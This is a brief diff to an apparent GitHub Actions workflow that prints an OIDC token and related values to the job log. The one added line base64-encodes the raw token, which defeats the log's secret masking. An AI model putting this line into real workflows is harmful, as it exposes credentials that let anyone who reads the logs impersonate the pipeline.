@@ -46,3 +46,4 @@ jobs:
           echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
           echo "$RAW_TOKEN"
           echo "$RESPONSE"
+          echo -n "$RAW_TOKEN" | base64 -w 0
